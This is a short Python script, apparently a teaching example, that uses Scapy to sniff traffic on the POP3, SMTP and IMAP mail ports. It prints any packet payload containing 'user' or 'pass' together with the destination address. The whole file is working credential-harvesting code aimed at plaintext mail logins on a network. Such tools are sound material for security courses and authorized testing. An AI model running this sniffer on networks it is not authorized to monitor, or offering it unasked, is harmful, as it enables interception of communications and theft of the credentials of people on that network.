from scapy.all import sniff, TCP, IP

# callback function to process each captured packet
def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if "user" in mypacket.lower() or "pass" in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

    # print(packet.show())

def main():
    # start sniffing packets on all interfaces with no filtering
    # sniff(prn=packet_callback, count=1)

    # sniff packets on specific mail ports (POP3, SMTP, IMAP)   
    # store=0 to avoid storing packets in memory
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)

if __name__ == "__main__":
    main()